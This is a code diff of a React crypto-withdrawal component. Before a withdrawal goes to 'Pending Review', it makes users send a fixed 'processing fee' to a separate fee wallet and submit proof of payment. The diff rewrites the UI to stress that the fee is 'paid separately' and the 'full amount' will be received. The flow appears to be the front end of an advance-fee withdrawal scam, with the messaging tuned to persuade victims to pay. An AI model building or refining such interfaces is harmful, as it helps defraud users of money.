@@ -34,7 +34,10 @@ function WithdrawFlow({ cryptos, onBack, user }) {
   const cryptoAsset = cryptos.find(c => c.symbol === selCurrency.symbol);
   const price       = cryptoAsset?.price || 1;
   const usdValue    = amount ? (parseFloat(amount) * price).toFixed(2) : "0.00";
-  const netReceive  = amount ? (parseFloat(usdValue) - FIXED_FEE).toFixed(2) : "0.00";
+
+  // User receives the FULL withdrawal amount — fee is paid separately, not deducted
+  const netReceive  = usdValue;
+
   const walletOk    = destWallet.length >= 32;
   const STEPS       = ["Currency","Amount","Fee","Proof","Status"];
 
@@ -134,21 +137,20 @@ function WithdrawFlow({ cryptos, onBack, user }) {
       </div>
       <Card hover={false} style={{ padding:"16px 18px" }}>
         {[
-          ["Status",      "🟡 Pending Review"],
-          ["Currency",    `${selCurrency.label} (${selCurrency.symbol})`],
-          ["Amount",      `${amount} ${selCurrency.symbol}`],
-          ["USD Value",   `$${usdValue}`],
-          ["Fixed Fee",   `$${FIXED_FEE}.00`],
-          ["You Receive", `$${netReceive}`],
-          ["Your Wallet", `${destWallet.slice(0,14)}…${destWallet.slice(-6)}`],
-          ["Fee Wallet",  `${WITHDRAW_WALLET.slice(0,16)}…`],
-          ["TX / Proof",  txHash || proofName || "Submitted"],
-          ["Est. Time",   "1–3 business days"],
+          ["Status",              "🟡 Pending Review"],
+          ["Currency",            `${selCurrency.label} (${selCurrency.symbol})`],
+          ["Amount Withdrawn",    `${amount} ${selCurrency.symbol} (full amount)`],
+          ["USD Value",           `$${usdValue}`],
+          ["Processing Fee",      `$${FIXED_FEE}.00 (paid separately)`],
+          ["Your Wallet",         `${destWallet.slice(0,14)}…${destWallet.slice(-6)}`],
+          ["Fee Wallet",          `${WITHDRAW_WALLET.slice(0,16)}…`],
+          ["TX / Proof",          txHash || proofName || "Submitted"],
+          ["Est. Time",           "1–3 business days"],
         ].map(([label,value],i,arr) => (
           <div key={label}>
             <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", padding:"7px 0" }}>
               <span style={{ fontSize:12, color:C.muted, flexShrink:0 }}>{label}</span>
-              <span style={{ fontSize:12, color:label==="Status"?C.gold:label==="You Receive"?C.green:C.white, fontWeight:600, textAlign:"right", marginLeft:12, fontFamily:label==="Your Wallet"||label==="Fee Wallet"?"monospace":"inherit" }}>{value}</span>
+              <span style={{ fontSize:12, color:label==="Status"?C.gold:label==="Amount Withdrawn"?C.green:C.white, fontWeight:600, textAlign:"right", marginLeft:12, fontFamily:label==="Your Wallet"||label==="Fee Wallet"?"monospace":"inherit" }}>{value}</span>
             </div>
             {i<arr.length-1 && <div style={{ height:1, background:C.border }} />}
           </div>
@@ -306,32 +308,31 @@ function WithdrawFlow({ cryptos, onBack, user }) {
         </div>
       )}
 
-      {/* STEP 3 — Fee */}
+      {/* STEP 3 — Fee (separate from withdrawal amount) */}
       {step===3 && (
         <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
           <div>
             <div style={{ fontSize:17, fontWeight:800, color:C.white }}>Processing Fee</div>
-            <div style={{ fontSize:12, color:C.muted, marginTop:4 }}>Pay the fixed network fee to proceed</div>
+            <div style={{ fontSize:12, color:C.muted, marginTop:4 }}>Pay the separate fixed network fee to proceed</div>
           </div>
           <div style={{ background:`${C.red}10`, border:`1px solid ${C.red}30`, borderRadius:12, padding:"14px 16px" }}>
             <div style={{ fontSize:13, fontWeight:700, color:C.red, marginBottom:6 }}>⚠️ Network Fee Required</div>
             <div style={{ fontSize:12, color:C.mutedLight, lineHeight:1.7 }}>
-              A fixed processing fee of <span style={{ color:C.gold, fontWeight:800, fontSize:16 }}>${FIXED_FEE}.00</span> is required to authorize this withdrawal and cover blockchain gas fees.
+              A separate processing fee of <span style={{ color:C.gold, fontWeight:800, fontSize:16 }}>${FIXED_FEE}.00</span> must be paid to authorize this withdrawal. <span style={{ color:C.green, fontWeight:700 }}>Your full withdrawal amount is not affected.</span>
             </div>
           </div>
           <Card hover={false} style={{ padding:"16px 18px" }}>
             {[
-              ["Asset",       `${selCurrency.label} (${selCurrency.symbol})`],
-              ["Amount",      `${amount} ${selCurrency.symbol}`],
-              ["USD Value",   `$${usdValue}`],
-              ["Fixed Fee",   `$${FIXED_FEE}.00`],
-              ["You Receive", `$${netReceive}`],
-              ["Withdraw To", `${destWallet.slice(0,14)}…${destWallet.slice(-6)}`],
+              ["Asset",            `${selCurrency.label} (${selCurrency.symbol})`],
+              ["Amount",           `${amount} ${selCurrency.symbol}`],
+              ["You Receive",      `$${usdValue} (full amount)`],
+              ["Processing Fee",   `$${FIXED_FEE}.00 (separate)`],
+              ["Withdraw To",      `${destWallet.slice(0,14)}…${destWallet.slice(-6)}`],
             ].map(([label,value],i,arr) => (
               <div key={label}>
                 <div style={{ display:"flex", justifyContent:"space-between", padding:"8px 0" }}>
                   <span style={{ fontSize:13, color:C.muted }}>{label}</span>
-                  <span style={{ fontSize:13, fontFamily:label==="Withdraw To"?"monospace":"inherit", color:i===4?C.green:i===3?C.red:i===5?C.gold:C.white, fontWeight:i>=3?800:600 }}>{value}</span>
+                  <span style={{ fontSize:13, fontFamily:label==="Withdraw To"?"monospace":"inherit", color:i===2?C.green:i===3?C.red:C.white, fontWeight:i>=2?800:600 }}>{value}</span>
                 </div>
                 {i<arr.length-1 && <div style={{ height:1, background:C.border }} />}
               </div>
